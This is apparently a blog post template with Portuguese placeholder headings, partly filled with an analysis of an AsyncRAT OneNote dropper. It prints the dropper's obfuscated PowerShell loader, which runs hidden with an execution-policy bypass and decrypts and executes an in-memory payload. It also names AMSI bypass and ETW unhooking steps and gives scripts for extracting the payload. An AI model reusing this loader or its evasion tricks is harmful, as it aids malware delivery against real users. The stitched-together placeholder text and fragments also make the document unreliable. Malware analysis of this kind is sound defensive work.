---
title: "Título"
classes: wide
header:
  teaser: /assets/images/AsyncRAT-OneNote-Dropper/logo.png
  overlay_image: /assets/images/AsyncRAT-OneNote-Dropper/logo.png
  overlay_filter: 0.5
ribbon: DarkSlateGray
excerpt: "Descrição de dentro do post"
description: "Descrição do card do post"
categories:
  - Malware Analysis
tags:
  - AsyncRAT
  - PowerShell
  - OneNote
  - Batch
  - .NET
  - Config Extraction  
toc: true
toc_sticky: true
toc_label: "On This Blog"
toc_icon: "biohazard"
---

# Intro
Texto de into...

# Tópico 1
Exemplo de como colocar foto (foto do post do blog que fiz o fork)
![image.png](/assets/images/AsyncRAT-OneNote-Dropper/1.png)


# Tópico 2
Exemplo
1. The script ....
2. A huge ...
3. A call ...


Exemplo de codigo no post
```powershell
1.
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "%~0.exe"

2.
cd "%~dp0"

3.
"%~nx0.exe" -noprofile -windowstyle hidden -ep bypass -command $flLnL = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine);foreach ($jhglm in $flLnL) { if ($jhglm.StartsWith(':: ')) {  $uDeAm = $jhglm.Substring(3); break; }; };$dLIJD = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($uDeAm);$nJkwh = New-Object System.Security.Cryptography.AesManaged;$nJkwh.Mode = [System.Security.Cryptography.CipherMode]::CBC;$nJkwh.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;$nJkwh.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('I5NM1YScgS/1//5R8gmm/tnI3DRCjxBbFnAG0xn8rTc=');$nJkwh.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('mehcJXqMnXZUmnmrBD1Eeg==');$bIbyd = $nJkwh.CreateDecryptor();$dLIJD = $bIbyd.TransformFinalBlock($dLIJD, 0, $dLIJD.Length);$bIbyd.Dispose();$nJkwh.Dispose();$gJfcg = New-Object System.IO.MemoryStream(, $dLIJD);$dkGYN = New-Object System.IO.MemoryStream;$yfRSU = New-Object System.IO.Compression.GZipStream($gJfcg, [IO.Compression.CompressionMode]::Decompress);$yfRSU.CopyTo($dkGYN);$yfRSU.Dispose();$gJfcg.Dispose();$dkGYN.Dispose();$dLIJD = $dkGYN.ToArray();$qMhaY = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($dLIJD);$haTMg = $qMhaY.EntryPoint;$haTMg.Invoke($null, (, [string[]] ('%*')))
```


```python
Print('Exemplo de código')

```


# Títlo 3

- **Exemplo subtopico** (exemplo de link [found here](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs)

![image-3.png](/assets/images/AsyncRAT-OneNote-Dropper/10.png)

- **Exemplo subtopico 2** which will disable the logging for Assembly.Load calls, this topic is explained in depth by [XPN](https://blog.xpnsec.com/hiding-your-dotnet-etw/).

```powershell
$reflectedAsm = [System.Reflection.Assembly]::LoadFile(PATH_TO_FILE)

$mainType = $reflectedAsm.GetType("rwcQssqTcyOdXXoBLoie.DCPmslvtGCDAiOhxxQvq")

$key = [System.Convert]::FromBase64String("iUlREPUR7NQ6ocefGLoxBty1eSNembQTSWsROZidb0A=")
$iv = [System.Convert]::FromBase64String("U+YnktYGyx/j43tP2+WVyw==")

$encryptedStrings = ("8qhzRqWw9fiH/7/a5reZMA==", "D/l1SD7OECP0XB2rUm87gA==", "lbk35FoNbOitTifMeNV97Q==", "uJDwrcc4OjLfnn4YCE0Bxw==", "x9nd50/ydQ4NyJMlduaTA1aZE7EpXLNuSa2GwfmjWlxjNEtyTrE+c9z9hlGIXS4Q")

foreach ($encArg in $encryptedStrings){
    $decodedArg = [System.Convert]::FromBase64String($encArg)
    $DecResult = [System.Text.Encoding]::UTF8.GetString(($mainType.GetMethod("MvljRQYEXFVoIflOHPxg")).invoke($null,@($decodedArg, $key, $iv)))
    Write-Output $DecResult
}
```
The decrypted strings are:
```console
AmsiScanBuffer
EtwEventWrite
payload.exe
runpe.dll
/c choice /c y /n /d y /t 1 & attrib -h -s "
```
The first two strings are part of the AMSI Bypass and ETW Unhooking procedures.
`payload.exe` and `runpe.dll` are strings that the loader will try to fetch from the binary resources, if we look at the resources of this binary we can see 2 resources:
- payload.exe
- Ticket_Reprint.pdf
The loader will iterate through the binary resources and if the name of the resource isn't one of the decrypted strings it will instantly fetch the content of the resource and execute it.
In our case the loader will load a fake PDF for the user:

![image-6.png](/assets/images/AsyncRAT-OneNote-Dropper/13.png)

![image-9.png](/assets/images/AsyncRAT-OneNote-Dropper/14.png)

![image-8.png](/assets/images/AsyncRAT-OneNote-Dropper/15.png)

The loader will decrypt the content of `payload.exe` resource which will be another **.gz** archive and it will decompress it with the method `XWmzUoViPReUSRriqGvB`.

![image-10.png](/assets/images/AsyncRAT-OneNote-Dropper/16.png)

For this I've also implemented a quick PowerShell script that will invoke those methods to retrieve the final payload 
```powershell
$stream = $reflectedAsm.GetManifestResourceStream("payload.exe")
$binaryReader = New-Object System.IO.BinaryReader($stream)
$contents = $binaryReader.ReadBytes($stream.Length)
$DecryptedGZ = $mainType.GetMethod("MvljRQYEXFVoIflOHPxg").invoke($null,@($contents, $key, $iv))
$finalPayload = $mainType.GetMethod("XWmzUoViPReUSRriqGvB").invoke($null, @(,$DecryptedGZ))

[io.file]::WriteAllBytes(PATH_TO_FILE,$finalPayload)
```
